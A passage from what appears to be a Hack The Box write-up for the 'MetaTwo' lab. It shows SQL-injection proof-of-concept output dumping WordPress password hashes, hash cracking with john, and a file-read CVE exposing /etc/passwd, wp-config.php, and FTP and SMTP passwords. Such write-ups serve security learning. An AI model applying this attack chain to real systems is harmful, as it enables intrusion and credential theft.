</span></span><span class=line><span class=cl>                <span class=nt>&lt;link</span> <span class=na>rel=</span><span class=s>&#34;alternate&#34;</span> <span class=na>type=</span><span class=s>&#34;text/html&#34;</span> <span class=na>href=</span><span class=s>&#34;http://metapress.htb/hello-world/&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;id&gt;</span>http://metapress.htb/?p=1<span class=nt>&lt;/id&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;updated&gt;</span>2022-06-23T18:05:43Z<span class=nt>&lt;/updated&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;published&gt;</span>2022-06-23T17:58:30Z<span class=nt>&lt;/published&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;category</span> <span class=na>scheme=</span><span class=s>&#34;http://metapress.htb&#34;</span> <span class=na>term=</span><span class=s>&#34;News&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;summary</span> <span class=na>type=</span><span class=s>&#34;html&#34;</span><span class=nt>&gt;</span><span class=cp>&lt;![CDATA[&lt;!-- wp:paragraph --&gt;
</span></span></span><span class=line><span class=cl><span class=cp>&lt;p&gt;This site will be launched soon.&lt;br&gt;In the meanwhile you can signup to our launch event.&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!-- /wp:paragraph --&gt;
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!-- wp:paragraph --&gt;
</span></span></span><span class=line><span class=cl><span class=cp>&lt;p&gt;Be sure to do it from here:&lt;br&gt;&lt;a href=&#34;http://metapress.htb/events/&#34;&gt;http://metapress.htb/events/&lt;/a&gt;&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!-- /wp:paragraph --&gt;]]&gt;</span><span class=nt>&lt;/summary&gt;</span>
</span></span><span class=line><span class=cl>                                        <span class=nt>&lt;content</span> <span class=na>type=</span><span class=s>&#34;html&#34;</span> <span class=na>xml:base=</span><span class=s>&#34;http://metapress.htb/hello-world/&#34;</span><span class=nt>&gt;</span><span class=cp>&lt;![CDATA[
</span></span></span><span class=line><span class=cl><span class=cp>&lt;p&gt;This site will be launched soon.&lt;br&gt;In the meanwhile you can signup to our launch event.&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=cp>&lt;p&gt;Be sure to do it from here:&lt;br&gt;&lt;a href=&#34;http://metapress.htb/events/&#34;&gt;http://metapress.htb/events/&lt;/a&gt;&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=cp>]]&gt;</span><span class=nt>&lt;/content&gt;</span>
</span></span><span class=line><span class=cl>                        <span class=nt>&lt;/entry&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/feed&gt;</span>
</span></span></code></pre></div><p>This tells me <code>admin</code> is the author so likely the <code>/login</code> page also uses <code>admin</code>. Nothing else really.</p><h3 id=burpsuite>burpsuite<a hidden class=anchor aria-hidden=true href=#burpsuite>#</a></h3><p>I then used <code>burp</code> to start going through the site. I noticed the <code>http://metapress.htb/?p=1</code> page convention, so I ran the <code>Intruder</code> to iterate from 1-1000 to see if anything interesting came up. Nothing here.</p><p>Before I did that, I noticed the booking an event feature. Since there were a lot of components to this, it seemed like something could be vulnerable here.</p><p>The event feature is uses the <code>bookingpress-appointment-booking</code> plugin as shown in the site map within <code>burp</code>.</p><p>To view more on the plugin, I visited <code>http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt</code>. Here we can see the version in use is <code>1.0.10</code></p><p>A quick google search shows: <a href=https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/bookingpress-appointment-booking/bookingpress-1011-sql-injection title="BookingPress < 1.0.11 - SQL Injection" target=_blank rel="nofollow noopener">BookingPress &lt; 1.0.11 - SQL Injection</a></p><h3 id=cve-2022-0739>CVE-2022-0739<a hidden class=anchor aria-hidden=true href=#cve-2022-0739>#</a></h3><p>Since <code>searchploit</code> didn&rsquo;t have anything that matched, I instead found a <a href=https://github.com/destr4ct/CVE-2022-0739/blob/main/booking-press-expl.py title="POC online" target=_blank rel="nofollow noopener">POC online</a>.</p><p>This gave the pretty output of:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>░█████╗░██╗░░░██╗███████╗░░░░░░██████╗░░█████╗░██████╗░██████╗░░░░░░░░█████╗░███████╗██████╗░░█████╗░
</span></span><span class=line><span class=cl>██╔══██╗██║░░░██║██╔════╝░░░░░░╚════██╗██╔══██╗╚════██╗╚════██╗░░░░░░██╔══██╗╚════██║╚════██╗██╔══██╗
</span></span><span class=line><span class=cl>██║░░╚═╝╚██╗░██╔╝█████╗░░█████╗░░███╔═╝██║░░██║░░███╔═╝░░███╔═╝█████╗██║░░██║░░░░██╔╝░█████╔╝╚██████║
</span></span><span class=line><span class=cl>██║░░██╗░╚████╔╝░██╔══╝░░╚════╝██╔══╝░░██║░░██║██╔══╝░░██╔══╝░░╚════╝██║░░██║░░░██╔╝░░╚═══██╗░╚═══██║
</span></span><span class=line><span class=cl>╚█████╔╝░░╚██╔╝░░███████╗░░░░░░███████╗╚█████╔╝███████╗███████╗░░░░░░╚█████╔╝░░██╔╝░░██████╔╝░█████╔╝
</span></span><span class=line><span class=cl>░╚════╝░░░░╚═╝░░░╚══════╝░░░░░░╚══════╝░╚════╝░╚══════╝╚══════╝░░░░░░░╚════╝░░░╚═╝░░░╚═════╝░░╚════╝░
</span></span><span class=line><span class=cl>PoC <span class=k>for</span> CVE-2022-0739 - Wordpress BookingPresss Plugin Version &lt; 1.0.11
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting: http://metapress.htb/events/
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Got Page. Title: <span class=s1>&#39;Events &amp;#8211; MetaPress&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Vulnerable version detected: 1.0.10
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Got Nonce: e7a1da68e4
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Got AJAX URL: http://metapress.htb/wp-admin/admin-ajax.php
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Fetching Target Info...
</span></span><span class=line><span class=cl>        <span class=o>[</span>*<span class=o>]</span> Running Data Query: SELECT VERSION<span class=o>()</span>,@@version_comment,@@version_compile_os,0,USER<span class=o>()</span>,DATABASE<span class=o>()</span>,7,8,9
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Target Info:
</span></span><span class=line><span class=cl>        <span class=o>[</span>+<span class=o>]</span> Version         : 10.5.15-MariaDB-0+deb11u1
</span></span><span class=line><span class=cl>        <span class=o>[</span>+<span class=o>]</span> Version Comment : Debian <span class=m>11</span>
</span></span><span class=line><span class=cl>        <span class=o>[</span>+<span class=o>]</span> Compile OS      : debian-linux-gnu
</span></span><span class=line><span class=cl>        <span class=o>[</span>+<span class=o>]</span> Database        : blog@localhost
</span></span><span class=line><span class=cl>        <span class=o>[</span>+<span class=o>]</span> User            : blog
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Leaking Wordpress Credentials...
</span></span><span class=line><span class=cl>        <span class=o>[</span>*<span class=o>]</span> Running Data Query: SELECT COUNT<span class=o>(</span>*<span class=o>)</span>,2,3,4,5,6,7,8,9 FROM wp_users
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Count: <span class=m>2</span>
</span></span><span class=line><span class=cl>        <span class=o>[</span>*<span class=o>]</span> Running Data Query: SELECT user_login,user_email,user_pass,4,5,6,7,8,9 FROM wp_users LIMIT <span class=m>1</span> OFFSET <span class=m>0</span>
</span></span><span class=line><span class=cl>        <span class=o>[</span>*<span class=o>]</span> Running Data Query: SELECT user_login,user_email,user_pass,4,5,6,7,8,9 FROM wp_users LIMIT <span class=m>1</span> OFFSET <span class=m>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
</span></span><span class=line><span class=cl>┃ Username ┃ Email                 ┃ Password Hash                      ┃
</span></span><span class=line><span class=cl>┡━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
</span></span><span class=line><span class=cl>│ admin    │ admin@metapress.htb   │ <span class=nv>$P$BGrGrgf2wToBS79i07Rk9sN4Fzk</span>.TV. │
</span></span><span class=line><span class=cl>│ manager  │ manager@metapress.htb │ <span class=nv>$P$B4aNM28N0E</span>.tMy/JIcnVMZbGcU16Q70 │
</span></span><span class=line><span class=cl>└──────────┴───────────────────────┴────────────────────────────────────┘
</span></span></code></pre></div><h3 id=john-the-ripper>john the ripper<a hidden class=anchor aria-hidden=true href=#john-the-ripper>#</a></h3><p><code>john</code> allowed me to crack one of these hashes.</p><p><em>file: hashes.txt</em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
</span></span><span class=line><span class=cl>manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/htb/metatwo<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ john hashes.txt --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>2</span> password hashes with <span class=m>2</span> different salts <span class=o>(</span>phpass <span class=o>[</span>phpass <span class=o>(</span><span class=nv>$P</span>$ or <span class=nv>$H</span>$<span class=o>)</span> 128/128 AVX 4x3<span class=o>])</span>
</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>8192</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>partylikearockstar <span class=o>(</span>manager<span class=o>)</span>
</span></span></code></pre></div><p>This let me login to <code>metapress.htb/login</code>.</p><p><figure class=image-caption><img alt=manager srcset="/posts/htb/easy/metatwo/images/manager_hu_f12d8d604370f042.webp 480w,
/posts/htb/easy/metatwo/images/manager_hu_96477ad32dcce94b.webp 768w,
/posts/htb/easy/metatwo/images/manager_hu_10c0b9de266f5412.webp 1024w" sizes=100vw src=images/manager.png width=768 height=498 loading=lazy><figcaption></figcaption></figure></p><h3 id=cve-2021-29447>CVE-2021-29447<a hidden class=anchor aria-hidden=true href=#cve-2021-29447>#</a></h3><p>I realized right away there must be something a malicious file to upload in order to get a shell or leak some data. I tried crafting several PHP reverse shells with the <code>magic bytes</code> of a PNG to pass Wordpress&rsquo;s file check, but these all failed. Eventually, I found <a href=https://github.com/motikan2010/CVE-2021-29447 title=CVE-2021-29447 target=_blank rel="nofollow noopener">CVE-2021-29447</a>.</p><p><figure class=image-caption><img alt=cve srcset="/posts/htb/easy/metatwo/images/cve_hu_ed85e7c6ec1e37f5.webp 480w,
/posts/htb/easy/metatwo/images/cve_hu_894995d97578d526.webp 768w,
/posts/htb/easy/metatwo/images/cve_hu_80e034d97dca02ba.webp 1024w" sizes=100vw src=images/cve.png width=768 height=507 loading=lazy><figcaption></figcaption></figure></p><p>Decoded gives:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
</span></span><span class=line><span class=cl>systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span class=line><span class=cl>mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span class=line><span class=cl>proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
</span></span></code></pre></div><p>Repeat for <code>/etc/nginx/sites-enabled/default</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>server</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>listen</span> <span class=mi>80</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>listen</span> <span class=p>[</span><span class=o>::</span><span class=p>]</span><span class=o>:</span><span class=mi>80</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>root</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nx>www</span><span class=o>/</span><span class=nx>metapress</span><span class=o>.</span><span class=nx>htb</span><span class=o>/</span><span class=nx>blog</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>index</span> <span class=nx>index</span><span class=o>.</span><span class=nx>php</span> <span class=nx>index</span><span class=o>.</span><span class=nx>html</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$http_host</span> <span class=o>!=</span> <span class=s2>&#34;metapress.htb&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>rewrite</span> <span class=o>^</span> <span class=nx>http</span><span class=o>://</span><span class=nx>metapress</span><span class=o>.</span><span class=nx>htb</span><span class=o>/</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>location</span> <span class=o>/</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>try_files</span> <span class=nv>$uri</span> <span class=nv>$uri</span><span class=o>/</span> <span class=o>/</span><span class=nx>index</span><span class=o>.</span><span class=nx>php</span><span class=o>?</span><span class=nv>$args</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>location</span> <span class=o>~</span> <span class=nx>\</span><span class=o>.</span><span class=nx>php</span><span class=err>$</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>include</span> <span class=nx>snippets</span><span class=o>/</span><span class=nx>fastcgi</span><span class=o>-</span><span class=nx>php</span><span class=o>.</span><span class=nx>conf</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>fastcgi_pass</span> <span class=nx>unix</span><span class=o>:/</span><span class=k>var</span><span class=o>/</span><span class=nx>run</span><span class=o>/</span><span class=nx>php</span><span class=o>/</span><span class=nx>php8</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=nx>fpm</span><span class=o>.</span><span class=nx>sock</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>location</span> <span class=o>~*</span> <span class=nx>\</span><span class=o>.</span><span class=p>(</span><span class=nx>js</span><span class=o>|</span><span class=nx>css</span><span class=o>|</span><span class=nx>png</span><span class=o>|</span><span class=nx>jpg</span><span class=o>|</span><span class=nx>jpeg</span><span class=o>|</span><span class=nx>gif</span><span class=o>|</span><span class=nx>ico</span><span class=o>|</span><span class=nx>svg</span><span class=p>)</span><span class=err>$</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>expires</span> <span class=nx>max</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nx>log_not_found</span> <span class=nx>off</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Repeat for <code>/var/www/metapress.htb/blog/wp-config.php</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=sd>/** The name of the database for WordPress */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_NAME&#39;</span><span class=p>,</span> <span class=s1>&#39;blog&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** MySQL database username */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_USER&#39;</span><span class=p>,</span> <span class=s1>&#39;blog&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** MySQL database password */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_PASSWORD&#39;</span><span class=p>,</span> <span class=s1>&#39;635Aq@TdqrCwXFUZ&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** MySQL hostname */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_HOST&#39;</span><span class=p>,</span> <span class=s1>&#39;localhost&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** Database Charset to use in creating database tables. */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_CHARSET&#39;</span><span class=p>,</span> <span class=s1>&#39;utf8mb4&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;DB_COLLATE&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;FS_METHOD&#39;</span><span class=p>,</span> <span class=s1>&#39;ftpext&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;FTP_USER&#39;</span><span class=p>,</span> <span class=s1>&#39;metapress.htb&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;FTP_PASS&#39;</span><span class=p>,</span> <span class=s1>&#39;9NYS_ii@FyL_p5M2NvJ&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;FTP_HOST&#39;</span><span class=p>,</span> <span class=s1>&#39;ftp.metapress.htb&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;FTP_BASE&#39;</span><span class=p>,</span> <span class=s1>&#39;blog/&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;FTP_SSL&#39;</span><span class=p>,</span> <span class=k>false</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/**#@+
</span></span></span><span class=line><span class=cl><span class=sd> * Authentication Unique Keys and Salts.
</span></span></span><span class=line><span class=cl><span class=sd> * @since 2.6.0
</span></span></span><span class=line><span class=cl><span class=sd> */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;AUTH_KEY&#39;</span><span class=p>,</span>         <span class=s1>&#39;?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;SECURE_AUTH_KEY&#39;</span><span class=p>,</span>  <span class=s1>&#39;x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;LOGGED_IN_KEY&#39;</span><span class=p>,</span>    <span class=s1>&#39;J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;NONCE_KEY&#39;</span><span class=p>,</span>        <span class=s1>&#39;SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;AUTH_SALT&#39;</span><span class=p>,</span>        <span class=s1>&#39;[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;SECURE_AUTH_SALT&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;LOGGED_IN_SALT&#39;</span><span class=p>,</span>   <span class=s1>&#39;4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;NONCE_SALT&#39;</span><span class=p>,</span>       <span class=s1>&#39;.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd> * WordPress Database Table prefix.
</span></span></span><span class=line><span class=cl><span class=sd> */</span>
</span></span><span class=line><span class=cl><span class=nv>$table_prefix</span> <span class=o>=</span> <span class=s1>&#39;wp_&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd> * For developers: WordPress debugging mode.
</span></span></span><span class=line><span class=cl><span class=sd> * @link https://wordpress.org/support/article/debugging-in-wordpress/
</span></span></span><span class=line><span class=cl><span class=sd> */</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;WP_DEBUG&#39;</span><span class=p>,</span> <span class=k>false</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** Absolute path to the WordPress directory. */</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span> <span class=o>!</span> <span class=nx>defined</span><span class=p>(</span> <span class=s1>&#39;ABSPATH&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;ABSPATH&#39;</span><span class=p>,</span> <span class=no>__DIR__</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=sd>/** Sets up WordPress vars and included files. */</span>
</span></span><span class=line><span class=cl><span class=k>require_once</span> <span class=nx>ABSPATH</span> <span class=o>.</span> <span class=s1>&#39;wp-settings.php&#39;</span><span class=p>;</span>
</span></span></code></pre></div><h3 id=ftp>ftp<a hidden class=anchor aria-hidden=true href=#ftp>#</a></h3><p><code>config.php</code> leaked <code>ftp</code> creds!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>metapress.htb | 9NYS_ii@FyL_p5M2NvJ
</span></span></code></pre></div><p>After logging in, I pulled back <code>mailer/send_mail.php</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * This script will be used to send an email to all our users when ready for launch
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>PHPMailer\PHPMailer\PHPMailer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>PHPMailer\PHPMailer\SMTP</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>PHPMailer\PHPMailer\Exception</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>require</span> <span class=s1>&#39;PHPMailer/src/Exception.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>require</span> <span class=s1>&#39;PHPMailer/src/PHPMailer.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>require</span> <span class=s1>&#39;PHPMailer/src/SMTP.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$mail</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>PHPMailer</span><span class=p>(</span><span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>SMTPDebug</span> <span class=o>=</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>isSMTP</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>Host</span> <span class=o>=</span> <span class=s2>&#34;mail.metapress.htb&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>SMTPAuth</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>Username</span> <span class=o>=</span> <span class=s2>&#34;jnelson@metapress.htb&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>Password</span> <span class=o>=</span> <span class=s2>&#34;Cb4_JmWM8zUZWMu@Ys&#34;</span><span class=p>;</span>
